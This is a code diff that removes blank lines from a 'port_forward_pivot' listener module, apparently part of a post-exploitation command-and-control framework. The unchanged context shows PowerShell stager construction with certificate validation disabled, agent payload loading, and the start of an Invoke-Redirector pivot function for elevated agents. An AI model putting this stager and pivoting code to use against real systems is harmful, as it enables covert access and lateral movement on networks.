@@ -17,7 +17,6 @@ log = logging.getLogger(__name__)
 
 class Listener(object):
     def __init__(self, mainMenu: MainMenu, params=[]):
-
         self.info = {
             "Name": "port_forward_pivot",
             "Authors": [
@@ -148,7 +147,6 @@ class Listener(object):
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 if userAgent.lower() != "none" or proxy.lower() != "none":
-
                     if userAgent.lower() != "none":
                         stager += "$wc.Headers.Add('User-Agent',$u);"
 
@@ -557,7 +555,6 @@ class Listener(object):
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == "powershell":
-
             with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                 code = f.read()
             # Get the random function name generated at install and patch the stager with the proper function name
@@ -846,7 +843,6 @@ class Listener(object):
                             return True
 
                         elif agent.language.lower() == "python":
-
                             # not implemented
                             script = """
                             """
@@ -875,9 +871,7 @@ class Listener(object):
             sessionID = self.mainMenu.agents.get_agent_id_db(name)
             isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)
             if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:
-
                 if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):
-
                     script = """
                 function Invoke-Redirector {
                     param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
